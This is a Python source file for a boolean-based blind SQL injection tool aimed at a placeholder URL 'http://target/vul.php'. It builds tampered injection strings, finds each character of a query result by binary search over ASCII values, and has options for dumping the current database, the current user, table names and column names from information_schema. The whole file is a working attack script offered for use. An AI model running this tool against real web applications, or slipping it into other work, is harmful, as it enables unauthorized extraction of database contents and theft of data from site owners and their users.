import requests
import sys
import argparse

def binary_search_ascii(request_func, query, char_index):
    low = 0
    high = 255
    
    while low <= high:
        mid = (low + high) // 2
        try:
            result = request_func(query, char_index, mid)
            if result:
                # 目標字符 > mid
                low = mid + 1
            else:
                # 目標字符 <= mid
                high = mid - 1
        except requests.RequestException as e:
            print(f"(-) Request failed: {e}")
            return None
    
    return low

def search_ascii(request_func, query, char_index):
    for c in range(1,128):
        result = request_func(query, char_index, c)
        if result:
            return c
    return False

def inject(query, request_func, guess_length=50, func_search=binary_search_ascii):
    extracted = ""
    for i in range(1, guess_length):
        # retrieved_value = binary_search_ascii(request_func, query, i)
        retrieved_value = func_search(request_func, query, i)
        if retrieved_value is not None and retrieved_value > 0:
            extracted += chr(retrieved_value)
            sys.stdout.write(chr(retrieved_value))
            sys.stdout.flush()
        else:
            break
    return extracted

def main():
    argparse = argparse.ArgumentParser(description="Blind SQL Injection Tool")
    argparse.add_argument("-q", "--query", help="SQL query to execute", default=None)
    argparse.add_argument("-T", help="Table name", default=None)

    query_gruop= argparse.add_mutually_exclusive_group(required=False)
    query_gruop.add_argument("--current-db", help="Get current database", action="store_true")
    query_gruop.add_argument("--current-user", help="Get current user", action="store_true")
    query_gruop.add_argument("--tables", help="Get tables", action="store_true")
    query_gruop.add_argument("--columns", help="Get columns", action="store_true")

    args = argparse.parse_args()
    proxies = {'http': 'http://127.0.0.1:8080',
           'https': 'http://127.0.0.1:8080'}
    # proxies = None
    
    # search_ascii        for ascii(substring(({query}),{char_index},1))=[CHAR]
    # binary_search_ascii for ascii(substring(({query}),{char_index},1))>[CHAR]
    func_search = binary_search_ascii
    def send_request(query, char_index, guess):
        # This function sends the request to the target URL with the injected SQL query
        # You can modify the URL and parameters as needed
        injection_string = f"test'/**/or/**/ascii(substring(({query}),{char_index},1))>[CHAR]/**/or/**/1='".replace('[CHAR]', str(guess))
        
        target = f"http://target/vul.php?q={injection_string}"
        response = requests.get(target, timeout=5, proxies=proxies)
        return condition(response)

    def condition(response):
        # This function checks the response to determine if the injection was successful
        # You can modify the condition based on the application's behavior
        try:
            if 'suggestions' in response.text:
                return True
            else:
                return False
        except Exception as e:
            print(f"(-) Error in condition check: {e}")
            return False

    def tamper(msg):
        return msg.replace(" ", "/**/")

    
    query = args.query

    if args.current_db:
        query = "select database()"
    elif args.current_user:
        query = "select user()"
    elif args.tables:
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() limit $$num$$,1"
    elif args.columns:
        if args.T is None:
            print("Please provide a table name with -T")
            sys.exit(1)
        query = f"select column_name from information_schema.columns where table_name='{args.T}' limit $$num$$,1"

    
    if query is not None:
        
        if '$$num$$' in query:
            print(f"Executing custom query: {tamper(query)}")
            for i in range(1,10):
                _query = query.replace("$$num$$", str(i))
                _query = tamper(_query)
                extracted = inject(_query, send_request, func_search=func_search)
                print('')
        else:
            query = tamper(query)
            print(f"Executing custom query: {query}")
            extracted = inject(query, send_request, func_search=func_search)
            print(f"\n(+) Extracted: {extracted}")

if __name__ == "__main__":
    main()